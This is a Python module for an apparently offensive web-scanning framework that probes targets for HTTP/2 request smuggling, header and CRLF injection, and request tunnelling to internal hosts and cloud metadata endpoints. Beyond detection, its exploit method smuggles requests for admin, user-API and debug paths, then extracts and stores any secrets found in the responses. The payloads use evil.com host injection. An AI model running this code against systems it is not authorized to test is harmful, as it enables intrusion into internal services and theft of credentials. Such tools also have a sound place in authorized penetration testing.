import re
import asyncio
from typing import Dict, List, Optional
from urllib.parse import urlparse
from modules.base import BaseModule


class H2smuggleModule(BaseModule):
    name = "h2smuggle"
    description = "HTTP/2 Request Smuggling Scanner"
    exploitable = True
    
    async def scan(self, target):
        self.findings = []
        self.vulnerable_endpoints: List[Dict] = []
        self.http2_version: Optional[str] = None
        
        if not await self._check_h2_support(target):
            self.log_info("Target does not support HTTP/2")
            return self.findings
        
        tasks = [
            self._test_h2_cl_desync(target),
            self._test_h2_te_desync(target),
            self._test_h2_header_injection(target),
            self._test_crlf_in_h2(target),
            self._test_request_tunneling(target),
        ]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        return self.findings
    
    async def _check_h2_support(self, target: str) -> bool:
        try:
            resp = await self.http.get(target)
            
            http_version = resp.get("http_version", "")
            if re.match(r"(HTTP/2|h2)", http_version, re.IGNORECASE):
                self.http2_version = http_version
                return True
            
            headers = resp.get("headers", {})
            alt_svc = str(headers.get("alt-svc", ""))
            if re.search(r'h2[="]', alt_svc, re.IGNORECASE):
                self.http2_version = "h2 (via alt-svc)"
                return True
            
            return True
        except:
            return False
    
    async def _test_h2_cl_desync(self, target: str):
        payloads = [
            {
                "headers": {"content-length": "0"},
                "body": "GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n",
                "name": "H2.CL basic",
            },
            {
                "headers": {"content-length": "6"},
                "body": "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n",
                "name": "H2.CL with chunked",
            },
            {
                "headers": {"content-length": "4"},
                "body": "XXXX" + "GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n",
                "name": "H2.CL overflow",
            },
        ]
        
        for payload in payloads:
            baseline = await self.http.post(target, data="test")
            baseline_len = len(baseline.get("text", ""))
            baseline_status = baseline.get("status")
            
            try:
                resp = await self.http.post(
                    target,
                    data=payload["body"],
                    headers=payload["headers"]
                )
                
                if not resp.get("status"):
                    continue
                
                resp_len = len(resp.get("text", ""))
                resp_status = resp.get("status")
                
                if resp_status != baseline_status or abs(resp_len - baseline_len) > 500:
                    indicators = ["admin", "internal", "unauthorized", "forbidden", "different"]
                    text = resp.get("text", "").lower()
                    
                    if any(ind in text for ind in indicators) or resp_status in [400, 403, 404, 500]:
                        self.add_finding(
                            "CRITICAL",
                            f"HTTP/2 Request Smuggling ({payload['name']})",
                            url=target,
                            evidence=f"Response differs significantly from baseline"
                        )
                        
                        self.vulnerable_endpoints.append({
                            "type": "h2_cl",
                            "payload": payload,
                            "response_diff": resp_len - baseline_len,
                        })
                        
                        self.record_success(payload["body"][:50], target)
                        return
            except:
                pass
    
    async def _test_h2_te_desync(self, target: str):
        te_payloads = [
            {
                "headers": {"transfer-encoding": "chunked"},
                "body": "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n",
                "name": "H2.TE basic",
            },
            {
                "headers": {"transfer-encoding": " chunked"},
                "body": "0\r\n\r\n",
                "name": "H2.TE space prefix",
            },
            {
                "headers": {"transfer-encoding": "chunked\t"},
                "body": "0\r\n\r\n",
                "name": "H2.TE tab suffix",
            },
            {
                "headers": {"transfer-encoding": "x]chunked"},
                "body": "0\r\n\r\n",
                "name": "H2.TE malformed",
            },
        ]
        
        baseline = await self.http.post(target, data="test")
        baseline_status = baseline.get("status")
        
        for payload in te_payloads:
            try:
                resp = await self.http.post(
                    target,
                    data=payload["body"],
                    headers=payload["headers"]
                )
                
                if resp.get("status") in [400, 500, 501, 502]:
                    self.add_finding(
                        "HIGH",
                        f"Potential H2.TE Desync ({payload['name']})",
                        url=target,
                        evidence=f"Server returned {resp.get('status')} on TE manipulation"
                    )
                    
                    self.vulnerable_endpoints.append({
                        "type": "h2_te",
                        "payload": payload,
                    })
            except:
                pass
    
    async def _test_h2_header_injection(self, target: str):
        injection_payloads = [
            ("x-injected", "test\r\nX-Evil: injected"),
            ("x-forwarded-for", "127.0.0.1\r\nX-Evil: injected"),
            ("host", "evil.com\r\nX-Injected: true"),
        ]
        
        for header_name, header_value in injection_payloads:
            try:
                resp = await self.http.get(target, headers={header_name: header_value})
                
                if resp.get("status"):
                    text = resp.get("text", "").lower()
                    resp_headers = str(resp.get("headers", {})).lower()
                    
                    if "x-evil" in resp_headers or "injected" in text:
                        self.add_finding(
                            "HIGH",
                            f"HTTP/2 Header Injection via {header_name}",
                            url=target,
                            evidence="Injected header reflected in response"
                        )
                        
                        self.vulnerable_endpoints.append({
                            "type": "header_injection",
                            "header": header_name,
                            "payload": header_value,
                        })
            except:
                pass
    
    async def _test_crlf_in_h2(self, target: str):
        crlf_payloads = [
            ("GET / HTTP/1.1\r\nHost: evil.com\r\n\r\n", ":path"),
            ("/\r\nHost: evil.com", ":path"),
            ("evil.com\r\nX-Injected: true", ":authority"),
            ("GET", ":method"),
        ]
        
        for payload, pseudo_header in crlf_payloads:
            try:
                if pseudo_header == ":path":
                    test_url = f"{target.rstrip('/')}/{payload}"
                    resp = await self.http.get(test_url)
                else:
                    resp = await self.http.get(target)
                
                if resp.get("status"):
                    text = resp.get("text", "").lower()
                    
                    if "evil.com" in text or "x-injected" in text:
                        self.add_finding(
                            "CRITICAL",
                            f"CRLF Injection in HTTP/2 {pseudo_header}",
                            url=target,
                            evidence=f"Payload: {payload[:30]}..."
                        )
                        
                        self.vulnerable_endpoints.append({
                            "type": "h2_crlf",
                            "pseudo_header": pseudo_header,
                            "payload": payload,
                        })
            except:
                pass
    
    async def _test_request_tunneling(self, target: str):
        parsed = urlparse(target)
        internal_hosts = [
            "localhost",
            "127.0.0.1",
            "internal",
            "admin",
            f"admin.{parsed.netloc}",
            "metadata.google.internal",
            "169.254.169.254",
        ]
        
        for internal in internal_hosts:
            tunnel_payload = f"GET / HTTP/1.1\r\nHost: {internal}\r\n\r\n"
            
            try:
                resp = await self.http.post(
                    target,
                    data=tunnel_payload,
                    headers={"content-length": str(len(tunnel_payload))}
                )
                
                if resp.get("status"):
                    text = resp.get("text", "")
                    
                    internal_indicators = [
                        "internal", "admin", "dashboard", "panel",
                        "ami-id", "instance-id", "metadata",
                        "localhost", "127.0.0.1",
                    ]
                    
                    for indicator in internal_indicators:
                        if indicator in text.lower():
                            self.add_finding(
                                "CRITICAL",
                                f"HTTP/2 Request Tunneling to {internal}",
                                url=target,
                                evidence=f"Internal resource indicator: {indicator}"
                            )
                            
                            self.vulnerable_endpoints.append({
                                "type": "tunneling",
                                "internal_host": internal,
                            })
                            
                            secrets = self.extract_secrets(text)
                            if secrets:
                                self.add_exploit_data("tunneled_secrets", secrets)
                            return
            except:
                pass
    
    async def exploit(self, target, finding):
        results = {
            "vulnerable_endpoints": self.vulnerable_endpoints,
            "smuggled_requests": [],
        }
        
        for vuln in self.vulnerable_endpoints:
            if vuln["type"] == "h2_cl":
                smuggle_requests = [
                    "GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n",
                    "GET /api/users HTTP/1.1\r\nHost: internal\r\n\r\n",
                    "GET /debug HTTP/1.1\r\nHost: internal\r\n\r\n",
                ]
                
                for req in smuggle_requests:
                    try:
                        resp = await self.http.post(
                            target,
                            data=req,
                            headers={"content-length": "0"}
                        )
                        
                        if resp.get("status") == 200:
                            text = resp.get("text", "")
                            
                            if len(text) > 100:
                                results["smuggled_requests"].append({
                                    "request": req,
                                    "response_preview": text[:500],
                                })
                                
                                secrets = self.extract_secrets(text)
                                if secrets:
                                    self.add_exploit_data(f"smuggled_secrets", secrets)
                    except:
                        pass
        
        if results["smuggled_requests"]:
            self.add_exploit_data("h2_smuggle_results", results)
        
        return results
